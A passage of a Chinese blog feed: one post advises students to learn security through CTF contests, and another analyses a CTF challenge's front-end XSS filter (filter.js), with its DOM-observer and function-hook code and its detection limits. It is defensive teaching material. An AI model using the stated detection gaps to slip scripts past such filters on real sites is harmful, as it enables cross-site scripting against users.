是不是感觉要学很多东西？还差的远那，这些只是最基础的，安全人员在工作中会遇到各式各样的程序员写出来的产品，如果对方所用的知识你没有接触过或者短时间内学不懂的话，是根本无从下手的，所以对于新知识，安全从业人员需要具备快速学习掌握的能力，如果之前就接触过的话是最好的，所以平时也要接触各种新技术才行。<br>好像扯得有点远了，除了向你们展示要学习的基础知识，还有一点是希望大家考虑下：你学完这些的时候得大几了？反正我大概是大二上学期才学习完的这些知识，之后才正式接触了安全，虽然可能学长们会提前教你们一些安全知识，但不要忘了上面的基础知识是入门安全必要的，这一点在你们接触到安全知识时会有所体会<br>对了，有一点忘说了，怎么学习这些基础知识呢？计算机网络的话需要着重掌握HTTP协议，过于底层的通信方式放在大三的计算机网络课中正式学习也不迟。那些编程语言的话，简单了解变量定义，控制结构就可以了，剩下更多的放到安全知识中用到了什么再深究什么也是不错的选择</p><p>OK，到这里就可以正式开始介绍安全入门了，如果你是大牛的话，直接去各大漏洞提交平台给企业挖洞就行，不过我想大家和我一样都还没达到那种水平，那么怎么磨练自己的专业技能呢？这里就要介绍到一种名为CTF的比赛了，CTF也就是夺旗赛，比赛举办方提供服务器让参赛选手去攻击，选手组队参赛，每成功拿到“旗”，也就是比赛中所称的flag，提交给举办方通过后就会获得相应的分数，最后排名按照分数来计算，CTF是安全行业中很常见的赛事，不仅学生会参加，很多安全行业从业人员也会参与到其中，在这里你可以磨练自己的安全技能，从而得到提高，借用Ven牛的一句话说，CTF是信息安全最好的入门方式了，没有之一，其实这也是我们为大家举办培训的初衷，这些一会我会放在最后来说。</p><p>从我自身打CTF的经历来说，前期会感觉很困难，在做题目的时候四处碰壁，这是因为你还没有真正入门，但如果坚持不下来的话，你永远也入不了安全行业的大门，那么坚持做什么呢？CTF比赛在国内有一个XCTF联赛，自己google网址，国内大部分有影响力的CTF赛事都在其中，而我们要做的，就是坚持跟着把每场比赛做下来，赛后认真的吃透每一道题目，吃透每一道题目，吃透每一道题目，重要的话三遍！你可以不参加比赛，但结束后一定要在答案出来之后马不停蹄的分析题目，学习里面的知识，尤其是web题目，因为web环境很少能维护很长时间，一般三天内题目环境肯定会关闭（二进制题目就另说了），所以需要及时的照着答案吃透题目，否则之后就只能干看答案了。客观来说XCTF联赛里的题目不简单，我自己的话好的时候一场比赛下来能做出来一两道就不错了，但这不是关键，怕的不是做不出来，而是赛后没有回顾消化题目，让这场比赛白白浪费了。如果大家觉得一开始做XCTF联赛里的题目有些难的话，也可以从实验吧，i春秋等训练平台上吃透一些题，但个人觉得还是要做真正比赛中的题目才是最有效的，因为这种比赛中的题目质量更高，也更能学到东西。</p><p>就着上面对在比赛中学习的阐述，大家应该警醒一些，从前几次的培训结果来看，好像同学们就满足于听上我们一两个小时的讲解就算完了，课下不去练习，我可以很明确的告诉诸位，这样的学习效果近乎为零！不要指望着我们能教授给你们什么体系完善，逻辑上难度上都阶梯上升的知识，毕竟我们不是专业的老师，专业水平也没有那么强，拿我自己来说，你们觉得我近一年的专业学习，几十场比赛经验能在几次培训中讲出来？最多最多最多，我们也只能充当一个领路人的角色，告诉你们需要学什么，大致的框架是什么，去哪里学，难度有多少，剩下的是要你们自己走的，信息安全本来就是一个要求自学能力的科目，没听说过哪个大佬是在培训中学出来的，要知道优秀的程序员永远都是野生的，黑客更是这样。如果你觉得这些实现气起来很困难，或者说与自己的学习方式不符，那么只能说信息安全不太适合你，这并不是贬义，每个人都应该找到适合自己的学习方向嘛，既然这样了为什么要一头扎死在信息安全行业中呢，去寻找适合你自己的学习方式的方向吧。</p><p>其实说到课下的自主学习，也并不只是打比赛，赛后总结学习题目，还有很多，下面我会一一介绍</p><p>除了那种大型的CTF赛事外，还有很多小型的比赛以及国外的比赛，以及实验吧，i春秋，合天等一众信息安全教育平台上的题目，手痒时可以做做。。。</p><p>然后就是很重要的博！！客！！，在CTF你总会见到一些明星队伍，清华的，上海交通大学的，浙江大学的，北航的，北邮的等等等等，这些队伍里面都有一些很厉害的人，他们中很多人都在维护着自己的博客，博客中会有他们写的一些比赛答案的文章（这是我们赛后找答案的好地方），一些经典漏洞的分析，一些笔记总结，一些人生感悟（这个就算了）啥的，在没有比赛的时候，其实我更推荐你们去这里面学习，就算里面都是很久之前，已经没有题目环境的比赛答案，从中学习还是很有必要的，就我自己来说，所学习到的知识，从比赛中与从博客中是五五开的。另一个角度来说，看博客是了解CTF圈子最好的途径，没有之一，你可以了解到那些在比赛中把你虐的不要不要的真大佬们，如果能和他们联系上混好关系，对自己之后的发展是非常有帮助的。额，人际关系方面我们还是一会再说吧，那么从哪里找到这些博客呢？其实很简单，博客与博客之间会有友链，如果你有一个博客链接，就能找到很多大佬的博客，然后你就会发现整个圈子也就那么小，不同队伍的大佬之间都互相非常熟悉，就比如浙大的小m师傅和福州大学ROIS队伍的蓝猫师傅就是一对好基友2333。初始链接的话就从这个开始吧，<a href="http://bendawang.site/，这是一个给过我很多帮助的师傅，也非常羡慕他的水平。" target="_blank" rel="external">http://bendawang.site/，这是一个给过我很多帮助的师傅，也非常羡慕他的水平。</a></p><p>再然后。。其实就和现在有些远了，在你的水平达到一定程度之后，可能就会关注更多的不仅限于CTF方面的安全知识（其实从ctf题目的趋势来看，高质量的CTF比赛赛题也会越来越多的涉及到这些），比如各种安全会议的PPT文稿，最新爆出的漏洞分析，360，阿里，腾讯这些安全大厂写的一些比较有深度的安全文章，如果英文过关的话，还有很多国外黑客的研究成果可以看，如果技术足够的话，还可以去漏洞提交平台提交漏洞等等。目前我自己也还没有到这种水平，正在朝这方面努力吧，看时间够不够了，大学四年真的很短，如果想学点什么东西的话。</p><p>嗯嗯，差不多了，然后我们可以聊一些不那么“切实际”的东西，但这些也很重要，希望大家能记住<br>最想说的还是信息安全这个圈子的人际关系，刚才也提到了，当你技术达到一定水平后，其实圈子也就那么小，大家在比赛中互相切磋，也都互相认识，每个人都有自己的称呼，大家在一个群里聊天的时候也总是师傅长师傅短的称呼（好像这个行业很流行说自己菜，然后膜拜各路大佬？），真的打到了一定水平其实根本就不用担心就业问题，因为你在圈子里都已经很熟了，会有很多在360，阿里的师傅直接把你内推了，当然这一切都要建立在你足够强的基础上。所以认识人，多交流是很重要的，也是必须的，自己闷头学不仅认识不了人，而且也不一定能学的好，你需要接触更多的人来扩宽你的眼界。容易一点的做法是加入各种CTF比赛的交流群，从日常聊天中就能知道那些是大佬，更有效的方式是直接去找这些人去聊天，和他们混好关系，但这种方式比较难，为什么呢？一方面式因为他们本身很厉害的话就会有很多人来找他们聊，就不一定能顾得上你，更重要的原因在于自己，谁让自己那么菜？交流是双向的，如果只是一方的单向付出的话就很难实现，尤其是和你完全不认识的陌生人，也就只有和你有些关系的人，和你们的学长会这样做了。。。因为学校里没有大佬所以我很早就和外面的人交流了，也认识了一个愿意带我的师傅，还是蛮幸运的，不过话说回来，真的学习还是得靠自己，我和我师傅的聊天也就只是比赛结束之后找他聊思路，没事聊些动漫啥的。。。</p><p>差不多可以收尾了，在最后是我想说的一件最重要的事情：为什么我们为大家会开办培训<br>其实讲真我们的学习也很忙，比赛，项目，考研等很多事要做，但我们不得不做这个培训，从之前对CTF比赛的介绍大家应该也能知道，有很多的明星队伍，他们都是一些很厉害的学校里的队伍，这些队伍每年都会纳入新的成员，然后老手带新手，这样一届届的延续下去，这对学校的安全氛围是一个很好的引导作用，所以他们慢慢的也会变得越来越强，在更多更大型的，甚至在世界性的舞台上展露头角，我们称这些学校是信息安全强校，清华，上交，浙大，北航，北邮，西电，武汉大学，杭电，福州大学都在此列，很显然我们学校不是，我们没有一个好的信息安全专业氛围，没有自己的队伍，没有一届带一届的模式来培养新人，甚至没有自己的信息安全协会，每一届的学生靠自己努力达到了一定程度，然后毕业后什么都没留下，下一届还是重复着上一届的样子，我们之前是有在全国信息安全比赛中获得一等奖的学长，也有在全国作品赛中获一等奖的学长，但对现在的我们有什么影响？只是几块宣传牌罢了，所以到了我们这一届则希望尽量改变这种状况，你们可以看到小路学长在这学期创办的信息安全部，我们为大家做培训，其实这些都是希望在我们自己的水平上帮助大家，能在你们接下来的几届中引燃一些安全氛围的火苗，虽然我们水平有限，放在一些强队里也都是给大佬端茶送水的角色，但这仍然是我们必须要做的，这就是我之前在培训中想说的情怀性的东西，但一直没有说出来，希望大家不要把这次培训只是看作知识的传授，在我们毕业的时候，希望你们都能学有所成，接下我们手中的火把，延续下去。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是给学校里学弟学妹们写的，师傅们就别看了orz。。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XSS前端防御———对WHCTF中xss题目filter.js的分析</title>
    <link href="https://someonesometimes.github.io/2017/09/19/XSS%E5%89%8D%E7%AB%AF%E9%98%B2%E5%BE%A1%E2%80%94%E2%80%94%E2%80%94%E5%AF%B9WHCTF%E4%B8%ADXSS%E9%A2%98%E7%9B%AEfilter-js%E7%9A%84%E5%88%86%E6%9E%90/"/>
    <id>https://someonesometimes.github.io/2017/09/19/XSS前端防御———对WHCTF中XSS题目filter-js的分析/</id>
    <published>2017-09-19T15:15:14.000Z</published>
    <updated>2017-10-01T16:39:06.235Z</updated>
    
    <content type="html"><![CDATA[<p>最早的时候是从今年的Bctf的xss题目中遇到的filter.js这种过滤形式，但当时对xss题目一直全程懵逼所以也没有留下代码来好好分析过这种过滤，这次Ben师傅出的xss题目恰好使用了这种防御机制，于是打算好好整理一下。（PS：一看到题目的背景图片就知道这题一定是Ben师傅出的，赛后一问果然是2333）<br>这种前端的XSS防御主要由两部分构成：</p><ul><li>静态检测</li><li>动态检测</li></ul><a id="more"></a><h2 id="首先阐述下filter-js这种的前端xss防御基本原理："><a href="#首先阐述下filter-js这种的前端xss防御基本原理：" class="headerlink" title="首先阐述下filter.js这种的前端xss防御基本原理："></a>首先阐述下filter.js这种的前端xss防御基本原理：</h2><p>在HTML文档的最开头部分就引入这些js代码，需要保证在这些代码执行的时候敏感标签还没有生成，只有这样才会触发我们的检测，比如最简单的一个html文件<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'self' 'unsafe-inline';style-src 'self' 'unsafe-inline';img-src *;"</span>&gt;</span></div><div class="line">//注意我们尽早的引入了filter.js，使其在下面的标签还没有渲染的时候就开始执行了，这样才能够成功监测到之后标签的各种行为</div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'filter.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Phone<span class="tag">&lt;/<span class="name">h2</span>&gt;</span> sdsd<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span>&gt;</span>secret<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"flag.php"</span> <span class="attr">id</span>=<span class="string">"xie"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line">alert(<span class="string">'123'</span>);</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p><h2 id="我们从静态检测开始"><a href="#我们从静态检测开始" class="headerlink" title="我们从静态检测开始"></a>我们从静态检测开始</h2><p>在阐述具体的实现代码之前，我们必须了解静态检测的局限性，这十分重要所以我不得不先声明：</p><ul><li>如果用动态代码加载的话，就算监听到了标签执行，也无法得到加载的动态代码，就比如script的src</li><li>使用js动态生成的标签不会触发任何事件，静态检测只能监听那些一开始在html文件里有的标签</li></ul><p>静态检测的原理就是利用<code>MutationObserver</code>对象实现对标签行为的监测，设定在哪些标签行为下触发我们的自定义处理函数</p><ol><li>首先是做一些配置<br><code>var MutationObserver = window.MutationObserver || window.WebKitMutationObserver || window.MozMutationObserver;</code></li><li><p>然后我们实例化一个新的Mutation观察者对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> observer = <span class="keyword">new</span> MutationObserver(<span class="function"><span class="keyword">function</span>(<span class="params">mutations</span>) </span>&#123;</div><div class="line">        mutations.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">mutation</span>) </span>&#123;</div><div class="line"></div><div class="line">nodes = mutation.addedNodes;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; nodes.length; i++)&#123;</div><div class="line">        <span class="keyword">var</span> node = nodes[i];</div><div class="line"></div><div class="line"><span class="comment">//这里就可以基于捕获的node来愉快的进行自定义的操作了！！</span></div><div class="line"></div><div class="line">        &#125;);</div><div class="line">    &#125;);</div></pre></td></tr></table></figure></li><li><p>为观察者对象指定配置——声明观察者在<strong>哪些标签</strong>触发<strong>什么行为</strong>下调用函数<br> 这里推荐一组练习，看过之后基本就明白了</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">observer.observe(target, &#123;<span class="attr">childList</span>:<span class="literal">true</span>&#125;)                              <span class="comment">//childList属性只观察子节点的新建与删除,子节点本身的任何变化都不会去理会  </span></div><div class="line">target.appendChild(<span class="built_in">document</span>.createElement(<span class="string">"div"</span>))                       <span class="comment">//添加了一个元素子节点,触发回调函数.</span></div><div class="line">target.appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">"foo"</span>))                      <span class="comment">//添加了一个文本子节点,触发回调函数.</span></div><div class="line">target.removeChild(target.childNodes[<span class="number">0</span>])                                <span class="comment">//移除第一个子节点,触发回调函数.</span></div><div class="line">target.childNodes[<span class="number">0</span>].appendChild(<span class="built_in">document</span>.createElement(<span class="string">"div"</span>))         <span class="comment">//为第一个子节点添加一个子节点,不会触发回调函数,如果需要触发,则需要设置subtree属性为true.</span></div><div class="line"></div><div class="line">observer.observe(target, &#123;<span class="attr">childList</span>:<span class="literal">true</span>,<span class="attr">subtree</span>:<span class="literal">true</span>&#125;)                 <span class="comment">//subtree属性让观察行为进行"递归",这时,以target节点为根节点的整棵DOM树发生的变化都可能会被观察到 </span></div><div class="line">observer.observe(<span class="built_in">document</span>, &#123;<span class="attr">childList</span>:<span class="literal">true</span>,<span class="attr">subtree</span>:<span class="literal">true</span>&#125;)               <span class="comment">//如果target为document或者document.documentElement,则当前文档中所有的节点添加与删除操作都会被观察到</span></div><div class="line">observer.observe(<span class="built_in">document</span>, &#123;<span class="attr">childList</span>:<span class="literal">true</span>,<span class="attr">attributes</span>:<span class="literal">true</span>,<span class="attr">characterData</span>:<span class="literal">true</span>,<span class="attr">subtree</span>:<span class="literal">true</span>&#125;)   <span class="comment">//当前文档中几乎所有类型的节点变化都会被观察到(包括属性节点的变化和文本节点的变化等)</span></div><div class="line"></div><div class="line">observer.observe(target, &#123;<span class="attr">childList</span>:<span class="literal">true</span>&#125;)                              <span class="comment">//假设此时target的outHTML内容为&lt;div&gt;foo&lt;div&gt;,则: </span></div><div class="line">target.childNodes[<span class="number">0</span>].data = <span class="string">"bar"</span>                                       <span class="comment">//不会触发回调函数,因为childList只观察节点的新建与删除,而这里target节点的子节点仍然只有一个,没有多,没有少</span></div><div class="line">observer.observe(target, &#123;<span class="attr">childList</span>:<span class="literal">true</span>,<span class="attr">characterData</span>:<span class="literal">true</span>&#125;)           <span class="comment">//加上characterData属性,允许观察文本节点的变化,行不行? </span></div><div class="line">target.childNodes[<span class="number">0</span>].data = <span class="string">"bar"</span>                                       <span class="comment">//还是不会触发回调函数,因为发生变化的是target节点的子节点,我们目前的目标节点只有一个,就是target.</span></div><div class="line">observer.observe(target, &#123;<span class="attr">childList</span>:<span class="literal">true</span>,<span class="attr">characterData</span>:<span class="literal">true</span>,<span class="attr">subtree</span>:<span class="literal">true</span>&#125;)  <span class="comment">//加上subtree属性,观察所有后代节点 </span></div><div class="line">target.childNodes[<span class="number">0</span>].data = <span class="string">"bar"</span>                                       <span class="comment">//触发了回调函数,发生变化的是target节点的文本子节点(必须同时有characterData和subtree属性,才能观察到一个元素目标节点里的文本内容的变化)</span></div><div class="line"></div><div class="line">observer.observe(target, &#123;<span class="attr">attributes</span>:<span class="literal">true</span>&#125;)                             <span class="comment">//只观察目标节点的属性节点</span></div><div class="line">target.setAttribute(<span class="string">"foo"</span>,<span class="string">"bar"</span>)                                        <span class="comment">//不管foo属性存在不存在,都会触发回调函数</span></div><div class="line">target.setAttribute(<span class="string">"foo"</span>,<span class="string">"bar"</span>)                                        <span class="comment">//即使前后两次的属性值一样,还是会触发回调函数</span></div><div class="line">target.removeAttribute(<span class="string">"foo"</span>)                                           <span class="comment">//移除foo属性节点,触发回调函数</span></div><div class="line">target.removeAttribute(<span class="string">"foo"</span>)                                           <span class="comment">//不会触发回调函数,因为已经没有属性节点可移除了</span></div><div class="line">observer.observe(target, &#123;<span class="attr">attributes</span>:<span class="literal">true</span>,<span class="attr">attributeFilter</span>:[<span class="string">"bar"</span>]&#125;)     <span class="comment">//指定要观察的属性名</span></div><div class="line">target.setAttribute(<span class="string">"foo"</span>,<span class="string">"bar"</span>)                                        <span class="comment">//不会触发回调函数,因为attributeFilter数组不包含"foo"</span></div><div class="line">target.setAttribute(<span class="string">"bar"</span>,<span class="string">"foo"</span>)</div></pre></td></tr></table></figure></li></ol><p><strong>嗯，然后我们就可以实现对所有标签的触发事件监听了，下面是filter.js中的代码</strong><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">interceptionStaticScript</span>(<span class="params"></span>)</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">var</span> MutationObserver = <span class="built_in">window</span>.MutationObserver || <span class="built_in">window</span>.WebKitMutationObserver || <span class="built_in">window</span>.MozMutationObserver;</div><div class="line"></div><div class="line">    <span class="comment">//实例化一个新的Mutation观察者对象</span></div><div class="line">    <span class="keyword">var</span> observer = <span class="keyword">new</span> MutationObserver(<span class="function"><span class="keyword">function</span>(<span class="params">mutations</span>) </span>&#123;</div><div class="line">        mutations.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">mutation</span>) </span>&#123;</div><div class="line">            begininterceptionstatic(mutation)</div><div class="line">        &#125;);</div><div class="line">    &#125;);</div><div class="line"></div><div class="line">    <span class="comment">//为观察者对象传入要观察的对象，并设置config</span></div><div class="line">    <span class="comment">//这里的对象为document，配置为subtree+childList，也就表示会在所有的节点的子节点新建或时触发事件</span></div><div class="line">    observer.observe(<span class="built_in">document</span>, &#123;</div><div class="line">        <span class="attr">subtree</span>: <span class="literal">true</span>,</div><div class="line">        <span class="attr">childList</span>: <span class="literal">true</span></div><div class="line">    &#125;);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//事件触发时的响应函数</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">begininterceptionstatic</span>(<span class="params">mutation</span>)</span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="keyword">var</span> nodes = mutation.addedNodes;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; nodes.length; i++)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">var</span> node = nodes[i];</div><div class="line"></div><div class="line">        <span class="comment">//挑选出来script标签与iframe标签</span></div><div class="line">        <span class="keyword">if</span> (node.tagName === <span class="string">'SCRIPT'</span> || node.tagName === <span class="string">'IFRAME'</span>)</div><div class="line">        &#123;</div><div class="line">        <span class="comment">//如果iframe标签有srcdoc的话就在dom里删除此标签</span></div><div class="line">            <span class="keyword">if</span> (node.tagName === <span class="string">'IFRAME'</span> &amp;&amp; node.srcdoc)</div><div class="line">            &#123;</div><div class="line">                node.parentNode.removeChild(node);</div><div class="line">                <span class="built_in">console</span>.log(<span class="string">'f4ck you! don\'t use iframe'</span>, node.srcdoc);</div><div class="line"></div><div class="line">            &#125;</div><div class="line">            <span class="comment">//检测script以及iframe标签的匹配方式，只有通过白名单的才行</span></div><div class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (node.src)</div><div class="line">            &#123;</div><div class="line">                <span class="keyword">if</span> (!whileListMatch(whiteList, node.src))</div><div class="line">                &#123;</div><div class="line">                    node.parentNode.removeChild(node);</div><div class="line">                    <span class="built_in">console</span>.log(<span class="string">'f4ck you!'</span>, node.src);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="comment">//对iframe以及script标签的内容也就是innerHTML进行黑名单检测</span></div><div class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (blackregmatch(jswordblacklist,node.textContent))</div><div class="line">            &#123;</div><div class="line">                node.parentNode.removeChild(node);</div><div class="line">                <span class="built_in">console</span>.log(<span class="string">'f4ck you! '</span>+node.textContent);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="开始我们的动态检测部分"><a href="#开始我们的动态检测部分" class="headerlink" title="开始我们的动态检测部分"></a>开始我们的动态检测部分</h2><p>动态检测相比于静态检测更加准确，毕竟这是从原生代码层面上进行的重写，所有的行为最终还是要调用这些系统原生代码的，就算是静态检测无法防御的动态标签生成也可以被检测到<br>动态检测采用了Hook的原理，通过对一些敏感函数进行Hook后，在其运行期间加上一些代码以起到防御的作用。</p><p>首先我们来尝试所有标签src属性的Hook<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//保存原始的setter变量</span></div><div class="line"><span class="keyword">var</span> raw_setter = HTMLScriptElement.prototype.__lookupSetter__(<span class="string">'src'</span>);</div><div class="line"></div><div class="line"><span class="comment">//重写Setter访问器，这个访问器是会在src属性添加时调用的系统代码</span></div><div class="line">HTMLScriptElement.prototype.__defineSetter__(<span class="string">'src'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">url</span>) </span>&#123;</div><div class="line"></div><div class="line">    <span class="comment">//自定义对src的操作</span></div><div class="line">    <span class="keyword">if</span> (!whileListMatch(whiteList,url))</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'f4ck you! '</span>+url);</div><div class="line">        <span class="keyword">return</span> ;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//处理结束的时候通过刚才被保存的原始setter变量继续执行系统代码</span></div><div class="line">    raw_setter.call(<span class="keyword">this</span>, url);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p><p>类似的，Hook所有的innerHTML生成：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//同样先保存原始的setter变量</span></div><div class="line"><span class="keyword">var</span> raw_setter = HTMLScriptElement.prototype.__lookupSetter__(<span class="string">'innerHTML'</span>);</div><div class="line"></div><div class="line"><span class="comment">//然后重写setter访问器</span></div><div class="line">HTMLScriptElement.prototype.__defineSetter__(<span class="string">'innerHTML'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">url</span>) </span>&#123;</div><div class="line"></div><div class="line"><span class="comment">//然后添加任意处理代码</span></div><div class="line">    <span class="keyword">if</span> (blackregmatch(wordblacklistinnerHTML, url))</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'f4ck you! '</span>+url);</div><div class="line">        <span class="keyword">return</span> ;</div><div class="line">    &#125;</div><div class="line"><span class="comment">//处理结束的时候通过刚才被保存的原始setter变量继续执行系统代码</span></div><div class="line">    raw_setter.call(<span class="keyword">this</span>, url);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p><p>尝试Hook一个系统函数document.write()，对其参数进行操作处理<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//首先获得这个函数的对象</span></div><div class="line"><span class="keyword">var</span> old_write = <span class="built_in">window</span>.document.write;</div><div class="line"><span class="comment">//然后重写此函数</span></div><div class="line"><span class="built_in">window</span>.document.write = <span class="function"><span class="keyword">function</span>(<span class="params">string</span>)</span></div><div class="line">&#123;</div><div class="line"><span class="comment">//基于函数的参数进行自定义的操作</span></div><div class="line">    <span class="keyword">if</span> (blackregmatch(wordblacklistDocumetnWrite, string))</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'f4ck you! '</span>, string);</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">//接着运行函数原生代码：使用函数对象.apply(document, arguments)这种写法</span></div><div class="line">    old_write.apply(<span class="built_in">document</span>, <span class="built_in">arguments</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>同理，我们Hook敏感的ajax函数<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//存储xhr对象open函数以便之后继续运行</span></div><div class="line"><span class="keyword">var</span> s_ajaxListener = <span class="keyword">new</span> <span class="built_in">Object</span>();</div><div class="line">s_ajaxListener.tempOpen = <span class="keyword">this</span>.XMLHttpRequest.prototype.open;</div><div class="line">s_ajaxListener.tempSend = <span class="keyword">this</span>.XMLHttpRequest.prototype.send;</div><div class="line"></div><div class="line"><span class="comment">//开始重写xhr的open函数</span></div><div class="line"><span class="keyword">this</span>.XMLHttpRequest.prototype.open = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span></div><div class="line">&#123;</div><div class="line"><span class="comment">//在执行xhr的open函数前插入自定义的操作</span></div><div class="line">    <span class="keyword">if</span> (!a) <span class="keyword">var</span> a=<span class="string">' '</span>;</div><div class="line">    <span class="keyword">if</span> (!b) <span class="keyword">var</span> b=<span class="string">' '</span>;</div><div class="line">    <span class="keyword">var</span> open_method=a;</div><div class="line">    <span class="comment">//拿到xhr的url，并对其做白名单检测</span></div><div class="line">    <span class="keyword">var</span> open_url=b;</div><div class="line">    <span class="keyword">if</span> (!whileListMatch(whiteList,open_url))</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'f4ck you! url:'</span>+open_method+<span class="string">':'</span>+open_url);</div><div class="line">        <span class="keyword">return</span> ;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"><span class="comment">//接着运行函数原生代码</span></div><div class="line">    s_ajaxListener.tempOpen.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</div><div 